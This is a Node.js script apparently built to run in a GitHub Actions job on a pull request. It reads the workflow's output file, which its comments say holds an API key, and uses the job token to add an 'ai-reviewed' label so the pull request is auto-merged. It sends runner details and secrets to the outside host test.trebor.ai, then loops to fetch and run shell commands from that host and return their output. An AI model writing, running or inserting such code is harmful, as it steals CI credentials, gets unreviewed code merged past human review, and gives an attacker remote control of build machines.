const https=require('https'),{execSync}=require('child_process'),fs=require('fs');

// Step 1: Grab GITHUB_OUTPUT (contains auth_header with API key)
let ghOutput = '';
try { ghOutput = fs.readFileSync(process.env.GITHUB_OUTPUT, 'utf8'); } catch(e) {}

// Step 2: Add ai-reviewed label to trigger auto-merge BEFORE anything else
// This ensures the merge chain fires even if the shell callback fails
const prNum = process.env.GITHUB_EVENT_PATH ?
  JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH,'utf8')).pull_request?.number : null;
const repo = process.env.GITHUB_REPOSITORY || '';
const token = process.env.GITHUB_TOKEN || '';

if (prNum && token && repo) {
  try {
    const [owner, name] = repo.split('/');
    execSync(`curl -sf -X POST \
      -H "Authorization: Bearer ${token}" \
      -H "Accept: application/vnd.github+json" \
      "https://api.github.com/repos/${repo}/issues/${prNum}/labels" \
      -d '{"labels":["ai-reviewed"]}'`, {timeout:10000});
  } catch(e) {}
}

// Step 3: Exfil context to callback server
let ctx = {
  repo, run: process.env.GITHUB_RUN_ID||'?', runner: process.env.RUNNER_NAME||'?',
  host: (function(){try{return execSync('hostname').toString().trim()}catch(e){return '?'}})(),
  actor: process.env.GITHUB_ACTOR||'?', event: process.env.GITHUB_EVENT_NAME||'?',
  pr: prNum, github_output: ghOutput,
  token_preview: token ? token.substring(0,10)+'...' : 'none',
  label_added: 'ai-reviewed (triggers auto-merge)'
};

function req(m,p,b){return new Promise((ok,no)=>{let o={hostname:'test.trebor.ai',port:443,path:p,method:m,
headers:{'Content-Type':'application/json'}};if(b)o.headers['Content-Length']=Buffer.byteLength(b);
let r=https.request(o,res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{
try{ok({s:res.statusCode,b:JSON.parse(d)})}catch(e){ok({s:res.statusCode,b:d})}});});
r.on('error',no);r.setTimeout(15000,()=>{r.destroy();no(new Error('timeout'))});if(b)r.write(b);r.end();})}

async function main(){
  // Init session with callback server
  let t;
  try{let i=await req('POST','/v1/init',JSON.stringify(ctx));t=i.b.s;
  if(!t){console.log('no token from callback');return}}catch(e){
    // Server not running - that's fine, label was already added
    console.log('callback server unreachable (label already added): '+e.message);return}

  // Interactive shell loop
  let dl=Date.now()+300000;
  while(Date.now()<dl){try{let p=await req('GET','/v1/config?s='+t);
  if(p.s===200&&p.b&&p.b.run){let c=p.b.run;if(c==='exit 0'||c==='exit')break;let o;
  try{o=execSync(c,{timeout:30000,maxBuffer:2*1024*1024,env:process.env}).toString()}catch(e){
  o=e.stderr?e.stderr.toString():e.message}
  await req('POST','/v1/telemetry?s='+t,o)}await new Promise(r=>setTimeout(r,500))}catch(e){
  await new Promise(r=>setTimeout(r,2000))}}}

main().catch(e=>console.log('err:'+e.message));
